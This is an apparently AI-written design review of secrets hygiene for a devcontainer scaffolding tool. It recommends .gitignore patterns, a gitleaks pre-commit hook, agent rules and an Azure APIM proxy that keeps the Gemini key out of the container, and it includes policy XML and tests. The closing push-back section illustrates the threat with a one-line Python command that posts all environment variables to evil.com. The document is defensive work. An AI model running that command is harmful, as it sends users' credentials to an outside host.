# 04a — Reviewer notes: Gemini 3.1 Pro Preview

> Independent review of [`03-llm-consultation-brief.md`](03-llm-consultation-brief.md).
> Model: `gemini-3.1-pro-preview` (Google Gemini CLI MCP).
> Date: 2026-05-09.
>
> Lightly reformatted for our doc style. Substance unchanged. Citations
> preserved where the reviewer attributed them.

## A. Maturity scoring

- **`.gitignore` coverage — 1/5.** Only `.env` and `.env.local` is a
  legacy standard. Massive blind spots for generated keys, certs,
  service-account JSON, agent local settings.
- **Agent rule clarity — 1/5.** No explicit constraints; agents will
  default to writing keys to files or echoing them.
- **Pre-commit detection — 0/5.** Non-existent.
- **Per-cloud docs — 0/5.** Non-existent.
- **Key-behind-proxy pattern — 0/5.** Missing. *"This is the only
  pattern that genuinely protects upstream LLM keys from an agent
  executing arbitrary code inside the container."*

## B. Concrete additions

### MUST — Expanded `.gitignore` (lives in `base/`)

```
# Secrets & Credentials
.env.*
!.env.example
*.pem
*.key
*.p12
id_rsa*
id_ed25519*
**/serviceAccount*.json
**/*-firebase-adminsdk-*.json
credentials.json
.claude/settings.local.json
.envrc
.aws/
.azure/
.gcloud/
```

**Argument for `base/` placement.** Ignoring secrets should not be
opt-in. A secure-by-default `.gitignore` is not a behavior change in
any meaningful sense. **Compatibility risk: very low** — only breaks
workflows of users who intentionally commit `.env.production`, which
is an anti-pattern.

### MUST — `gitleaks` via pre-commit (folded into `harness` stack)

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.2
    hooks:
      - id: gitleaks
```

Active enforcement: `git commit` halts when high-entropy strings or
known patterns appear in the staged diff.

**Strong argument against a separate `--stack secrets`:**

> *"Adding a separate `secrets` stack creates decision fatigue and
> allows users to opt-out of critical safety rails while opting-in to
> agent automation. Security should not be 'a la carte'."*

Place it inside the existing `harness` stack.

**Compat risk: medium.** Commits get blocked. Mitigated via a
documented `.gitleaksignore` for known false positives in test fixtures.

### SHOULD — Centralized agent rules in `AGENTS.md` / `CLAUDE.md`

```md
<system_constraints>
- SECRETS MANAGEMENT: NEVER write API keys, passwords, or tokens to
  files. NEVER output them in terminal logs.
- If environment variables are required, instruct the user to add
  them to a single `.env` file at the repository root. Do not create
  `.env.development` or `.env.test`.
- Do not download or store cloud credential files (e.g. GCP service
  accounts, AWS PEMs) in the workspace. Use local cloud CLI
  authentication (`aws sso`, `gcloud auth`).
</system_constraints>
```

Lives inside the `harness` stack's agent files.
**Compat risk: zero.**

## C. The Azure Foundry → APIM → Gemini → Cosmos pattern

> The reviewer recommends publishing this as
> `docs/patterns/zero-trust-apim-proxy.md`.

### The honest framing it opens with

> *"When an AI agent operates inside a `sunaba-cli` devcontainer, it
> has access to the local environment variables. If you pass your root
> Google Gemini API key into the container via `.env`, the agent can
> read it, log it, or exfiltrate it. To achieve a true Zero-Trust
> posture, the upstream LLM API key must never enter the
> devcontainer."*

We keep that framing verbatim in the published doc.

### Architecture

1. **Devcontainer / agent.** Authenticates to APIM via Azure Managed
   Identity (or local `azure-identity` `DefaultAzureCredential` in dev).
   Requests a short-lived Entra ID token. **Never sees the Gemini key.**
2. **Azure APIM (proxy).** Validates the Entra ID token. Fetches the
   real Gemini key from Key Vault. Injects it as the upstream auth
   header.
3. **Google Gemini API.** Receives the authenticated request from APIM.
4. **Cosmos DB.** APIM asynchronously logs request/response payloads
   for audit. Outside the agent's reach.

### Required resources

- **Azure AI Foundry Project** for agent identity and endpoints.
- **Azure API Management** (Consumption or Developer tier).
- **Azure Key Vault** for the `google-gemini-api-key` secret.
- **Azure Cosmos DB (NoSQL)** for audit logs.
- **System-assigned Managed Identity** on the APIM instance, with
  *Key Vault Secrets User* on the vault and *Cosmos DB Data
  Contributor* on the database.

### APIM policy (inbound + outbound)

```xml
<policies>
    <inbound>
        <base />
        <!-- 1. Validate the Entra ID token from the agent -->
        <validate-jwt header-name="Authorization"
                      failed-validation-httpcode="401"
                      failed-validation-error-message="Unauthorized agent">
            <openid-config url="https://login.microsoftonline.com/{tenant-id}/v2.0/.well-known/openid-configuration" />
            <audiences>
                <audience>{apim-app-registration-client-id}</audience>
            </audiences>
        </validate-jwt>

        <!-- 2. Fetch the real Gemini key from Key Vault (cached 5 min) -->
        <cache-lookup-value key="gemini-api-key" variable-name="geminiKey" />
        <choose>
            <when condition="@(!context.Variables.ContainsKey("geminiKey"))">
                <send-request mode="new" response-variable-name="kvResponse" timeout="10" ignore-error="false">
                    <set-url>https://{your-key-vault}.vault.azure.net/secrets/gemini-api-key/?api-version=7.0</set-url>
                    <set-method>GET</set-method>
                    <authentication-managed-identity resource="https://vault.azure.net" />
                </send-request>
                <set-variable name="geminiKey" value="@((String)((IResponse)context.Variables["kvResponse"]).Body.As<JObject>()["value"])" />
                <cache-store-value key="gemini-api-key" value="@((string)context.Variables["geminiKey"])" duration="300" />
            </when>
        </choose>

        <!-- 3. Inject the upstream Gemini key + rewrite backend -->
        <set-header name="x-goog-api-key" exists-action="override">
            <value>@((string)context.Variables["geminiKey"])</value>
        </set-header>
        <set-backend-service base-url="https://generativelanguage.googleapis.com" />
    </inbound>

    <outbound>
        <base />
        <!-- 4. Async audit log to Cosmos DB.
             For higher volume, switch to log-to-eventhub. -->
        <send-request mode="new" timeout="5" ignore-error="true">
            <set-url>https://{your-cosmos}.documents.azure.com/dbs/audit/colls/logs/docs</set-url>
            <set-method>POST</set-method>
            <set-header name="x-ms-date" exists-action="override">
                <value>@(DateTime.UtcNow.ToString("r"))</value>
            </set-header>
            <set-header name="x-ms-version" exists-action="override">
                <value>2018-12-31</value>
            </set-header>
            <authentication-managed-identity resource="https://{your-cosmos}.documents.azure.com" />
            <set-body>@{
                return new JObject(
                    new JProperty("id", context.RequestId),
                    new JProperty("timestamp", DateTime.UtcNow),
                    new JProperty("agentIdentity", context.Request.Headers.GetValueOrDefault("Authorization", "").Split(' ').LastOrDefault()),
                    new JProperty("promptTokens", context.Response.Headers.GetValueOrDefault("x-ratelimit-remaining-tokens", "unknown")),
                    new JProperty("status", context.Response.StatusCode)
                ).ToString();
            }</set-body>
        </send-request>
    </outbound>
</policies>
```

### Smallest end-to-end demo (the agent never sees the Gemini key)

```python
from azure.identity import DefaultAzureCredential
import requests

# 1. Get an Entra ID token via local CLI auth or Managed Identity
credential = DefaultAzureCredential()
token = credential.get_token("api://{apim-app-registration-client-id}/.default").token

# 2. Call APIM, not Google directly
apim_url = "https://your-apim-instance.azure-api.net/gemini/v1beta/models/gemini-2.5-pro:generateContent"
headers = {
    "Authorization": f"Bearer {token}",
    "Content-Type": "application/json",
}
payload = {"contents": [{"parts": [{"text": "Write a python script."}]}]}

resp = requests.post(apim_url, headers=headers, json=payload)
print(resp.json())
```

### Trade-offs

- **Performance.** ~30–50ms added latency for the proxy hop.
- **Cost.** APIM Consumption: first 1M calls free; Cosmos: storage +
  RU/s.
- **Observability.** Very high — every prompt + response audited in
  Cosmos, outside the agent's control.

## D. Per-cloud one-liners

### Vercel

- Live in: **Vercel Project Settings → Environment Variables.**
- Local dev: `vercel env pull .env.local`.
- One-line agent rule: *"NEVER write secrets to `.env.local` manually;
  always run `vercel env add` and `vercel env pull`."*

### Firebase / Google Cloud

- Live in: **Google Secret Manager.**
- Local dev: **Application Default Credentials (ADC).**
- One-line agent rule: *"NEVER download or create service-account JSON
  keys (`*-firebase-adminsdk-*.json`). Authenticate exclusively via
  `gcloud auth application-default login`."*

### AWS

- Live in: **AWS Secrets Manager** or **SSM Parameter Store**
  (SecureString).
- Local dev: **AWS IAM Identity Center / SSO** for short-lived tokens.
- One-line agent rule: *"NEVER request or create long-lived IAM access
  keys (`AKIA...`); authenticate exclusively using `aws sso login`."*

## E. Test strategy

```python
def test_base_gitignore_contains_secret_patterns(cli_runner, tmp_path):
    result = cli_runner.invoke(app, ["new", str(tmp_path), "--stack", "base"])
    assert result.exit_code == 0
    gitignore = (tmp_path / ".gitignore").read_text()
    expected = [
        "*.pem",
        "**/serviceAccount*.json",
        ".claude/settings.local.json",
        ".env.*",
        "!.env.example",
    ]
    for pat in expected:
        assert pat in gitignore, f"Missing {pat} in .gitignore"
```

```python
import yaml

def test_harness_includes_gitleaks(cli_runner, tmp_path):
    result = cli_runner.invoke(app, ["new", str(tmp_path), "--stack", "harness"])
    config = yaml.safe_load((tmp_path / ".pre-commit-config.yaml").read_text())
    repos = [r.get("repo") for r in config.get("repos", [])]
    assert "https://github.com/gitleaks/gitleaks" in repos
```

## F. Top-3 picks

1. **Expanded `.gitignore` in `base/`** — five-minute change, zero
   maintenance, immediately stops the bulk of accidental commits from
   "messy" agent runs.
2. **`gitleaks` in the `harness` stack via `.pre-commit-config.yaml`** —
   the only active defense at the repo layer.
3. **APIM-proxy documentation** — the only mitigation that survives a
   compromised container. Differentiates `sunaba-cli` from generic
   scaffolding tools.

## G. Push-back

- **Be brutally honest about runtime env access.** `gitleaks` and a
  better `.gitignore` do **nothing** to prevent
  `python -c 'import os, requests;
  requests.post("https://evil.com", data=os.environ)'` from an
  autonomous agent. *"If a user provides a real, billing-enabled API
  key into the devcontainer via `.env`, that key is compromised the
  moment a malicious or hallucinating agent decides to exfiltrate it.
  The APIM proxy is the only technical mitigation for this."*
- **Reject `--stack secrets`.** *"Security should not be an 'à la
  carte' menu item. If a user is explicitly setting up an agent
  harness, secure defaults must be baked into that harness. A
  separate `--stack secrets` implies that running agents without
  secret protection is an acceptable supported path. It is not."*
